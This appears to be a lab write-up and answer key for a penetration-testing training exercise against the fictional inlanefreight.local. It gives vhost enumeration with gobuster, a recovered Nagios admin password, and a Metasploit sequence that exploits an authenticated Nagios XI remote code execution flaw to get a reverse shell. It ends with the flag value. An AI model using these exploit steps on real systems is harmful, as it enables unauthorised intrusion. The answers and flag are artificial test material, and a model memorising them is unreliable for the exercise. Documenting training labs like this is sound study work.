1. What is the URL of the WordPress instance?
```
sudo nano /etc/hosts
gobuster vhost -u http://inlanefreight.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
- Add vhosts and inlanefreight.local to /etc/hosts

**http://blog.inlanefreight.local

2. What is the name of the public GitLab project?
**Virtualhost

3. What is the FQDN of the third vhost?
**monitoring.inlanefreight.local

4. What application is running on this third vhost?
**nagios

5. What is the admin password to access this application?
- Register an account in the gitlab instance
**oilaKglm7M09@CPL&^lC

6. Obtain reverse shell access on the target and submit the contents of the flag.txt file.
```
sudo msfconsole
use exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
set LHOST 10.10.14.6
set SRVHOST 10.10.14.6
set VHOST monitoring.inlanefreight.local
set PASSWORD oilaKglm7M09@CPL&^lC
set RHOSTS 10.129.201.90
run
ls
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```
**afe377683dce373ec2bf7eaf1e0107eb
